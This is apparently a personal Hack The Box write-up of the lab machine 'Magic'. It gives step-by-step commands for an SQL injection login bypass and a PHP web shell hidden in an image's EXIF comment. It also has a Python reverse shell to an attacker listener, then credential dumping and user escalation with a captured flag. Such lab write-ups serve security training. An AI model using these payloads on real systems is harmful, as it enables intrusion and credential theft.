Nmap:
nmap-output.nmap
Ports 22, 80 open

Gobuster:
Only 3 places available/

Dirsearch:
There are a LOT of .sql files!
Found 2 .sh files:
jenkins, travis

WFuzz:



---
Hydra: jenkins, travis did not work --> SSH doesn't allow Password Authentication.

10.10.10.185/login --> Bypass login using:

Username: 'OR '1'='1
Password: 'OR '1'='1

Can select an image to upload.

Upload packet capture: upload-snapshot.txt
Uploading a test.png returns "What are you trying to do there?"

Exploit to get Reverse Shell:

1. Get any old .png file
e.g. normal.jpg

2. run exiftool:
`kali@kali:~/labs/hackthebox/magic/files$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' normal.jpg
1 image files updated`

- This adds a comment to allow this file to take cmd inputs.

3. Change name
mv normal.jpg normal.php.jpg

4. Login, Upload Image, choose normal.php.jpg

5. On the SAME page, change the URL to:
10.10.10.185/images/uploads/normal.php.jpg

If you get a page with a bunch of jibberish, it has worked! Now you'll be able to pass a reverse shell through the URL.

6. Start an nc listener on Kali VM
nc -lvnp 4444

7. Add the following to the end of the URL + execute:

10.10.10.185/images/uploads/normal.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.24",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

- Dissecting this:
  - ?cmd= : Command input
  - python3.... : Python Reverse Shell. Tried with python, didn't work, tried with python3 and it worked! (Wonder if standard nc would work though).



Reverse shell!

----

www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
`<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}`

That password doesn't work for home page though.

/etc/passwd:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
```

Found a dump.sql file (feel like it's someone else's work though), so let's see if we can find how they got this:

```
www-data@ubuntu:/$ cat /var/www/Magic/images/uploads/dump.sql

cat /var/www/Magic/images/uploads/dump.sql
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-07-03 21:17:08
www-data@ubuntu:/$
```

```
www-data@ubuntu:/$ find / -name *sql 2>/dev/null
find / -name *sql 2>/dev/null

/usr/share/php7.4-mysql
/usr/share/php7.4-mysql/mysql
/usr/share/bash-completion/completions/psql
/usr/share/bash-completion/completions/mysql
/usr/share/bash-completion/completions/isql
/usr/share/doc/php7.4-mysql
/usr/share/doc/php-mysql
/usr/share/doc/php7.3-mysql
/usr/share/doc/php7.0-mysql
/usr/share/mysql
/usr/share/mysql/fill_help_tables.sql
/usr/share/mysql/mysql_test_data_timezone.sql
/usr/share/mysql/mysql_sys_schema.sql
/usr/share/mysql/install_rewriter.sql
/usr/share/mysql/debian_create_root_user.sql
/usr/share/mysql/innodb_memcached_config.sql
/usr/share/mysql/mysql_system_tables_data.sql
/usr/share/mysql/mysql_security_commands.sql
/usr/share/mysql/uninstall_rewriter.sql
/usr/share/mysql/mysql_system_tables.sql
/usr/share/bug/php7.4-mysql
/usr/share/bug/php7.3-mysql
/usr/share/bug/php7.0-mysql
/usr/share/lintian/overrides/php7.4-mysql
/usr/share/lintian/overrides/php7.3-mysql
/usr/share/lintian/overrides/php7.0-mysql
/usr/share/php7.3-mysql
/usr/share/php7.3-mysql/mysql
/usr/share/php7.0-mysql
/usr/share/php7.0-mysql/mysql
/usr/bin/mysql_tzinfo_to_sql
/usr/lib/mysql
/snap/core18/1223/etc/apparmor.d/abstractions/mysql
/snap/core18/1668/etc/apparmor.d/abstractions/mysql
/snap/core/8689/etc/apparmor.d/abstractions/mysql
/snap/core/8689/usr/share/bash-completion/completions/isql
/snap/core/8689/usr/share/bash-completion/completions/mysql
/snap/core/8689/usr/share/bash-completion/completions/psql
/snap/core/7917/etc/apparmor.d/abstractions/mysql
/snap/core/7917/usr/share/bash-completion/completions/isql
/snap/core/7917/usr/share/bash-completion/completions/mysql
/snap/core/7917/usr/share/bash-completion/completions/psql
/etc/init.d/mysql
/etc/rc3.d/S01mysql
/etc/rc5.d/S01mysql
/etc/rc4.d/S01mysql
/etc/rc0.d/K01mysql
/etc/mysql
/etc/rc2.d/S01mysql
/etc/rc1.d/K01mysql
/etc/apparmor.d/abstractions/mysql
/etc/rc6.d/K01mysql
/var/www/Magic/images/uploads/dump.sql
/var/log/mysql
/var/lib/mysql
/var/lib/php/modules/7.0/registry/pdo_mysql
/var/lib/php/modules/7.4/apache2/enabled_by_maint/pdo_mysql
/var/lib/php/modules/7.4/cli/enabled_by_maint/pdo_mysql
/var/lib/php/modules/7.4/registry/pdo_mysql
/var/lib/php/modules/7.3/apache2/enabled_by_maint/pdo_mysql
/var/lib/php/modules/7.3/cli/enabled_by_maint/pdo_mysql
/var/lib/php/modules/7.3/registry/pdo_mysql
```
https://support.hostway.com/hc/en-us/articles/360000220190-How-to-backup-and-restore-MySQL-databases-on-Linux

mysqldump -u theseus -p iamkingtheseus Magic > dump.sql

Gives the same response as above! Perfect, so don't need to show my output, but it's just a different date.

Username: theseus
Password: Th3s3usW4sK1ng

`su theseus` now works!

theseus@ubuntu:~$ cat user.txt
cat user.txt
4074fa4a7a3a3aa4d085594ca32e036c

---
Found 2 authorized keys for theseus:

theseus@ubuntu:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRnE5SB9gPw+7ALzAz6zmIqY9RkuLijDpFs8/xFn/yVEW54ktLDXKR1DveRQvfZ9vnFALQ6jdZkA1g28M28KL/77zHdKCVlI+jWTcZmkgJaRZEs5D5sG3dRiPNaFyps5D3/IvgqMoaG5e0oEgXMDuB2QiInGUS/WLSj1H2HNL6wo+le4kUqmk0oQaOS0WA80sc4iPSRUYNdr7r/HXOzdK0DB2t82/dq2HSZZHupXEupQ0rUQoUxjvhlAnc9sCp6DP/xpgk3ur7yGE65Hg/bO+MBUCptmmix4lsWdU7ZjbDHsWyEUldjTaHx0d9tnW6vn5mSOCdi09qrA4XkSxuVWwmEJAd0C8s0dmqk0PFZeN9fWNmbCvoREKGUc8eUEByXLuG++dHNk7GR/0uvN9yakFKbU5xOkQVFJfMGvVMJpXdh4jJpBAcQg4SWXE9EzQkQmMKPCSvccUhC1H+vWbQTkzddzVnu8fE3PYOVNAhl/CXA7SUqEEit0Y4ffGsF6kZCCU= root@klin

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0gM1MIfBsoTEmgHAjecl58O2UImEtqb2mfGbQstzm7l0RO0Rq6XXhVUBimXGYiEK5zXNifmDyyYyXz1gmWvt7GE3gm79SC3NliPDhVbg1gM5Fry32yev0hr8/q5xJIzXrDluc+bxXuIH5EHxTB173vSInsEtOV0OZWU37IsGN8N4GZKwZZic4ITgOzk3CKhEcr3K6q4+oNZl2GkCz5P9Ic3TD25V0Ejy50rBmzRrjb4YU94sDow6RHhccuV/vcf+JJPOn1W9glkyZ+kfn591zIxiuY8rNY2y4yUl19OlDIRDeJMqOQuqvZEM+Ano+4L5QgWI4vwzjkhtT+Gl8TrRL root@kali

(May be other users ones tho)
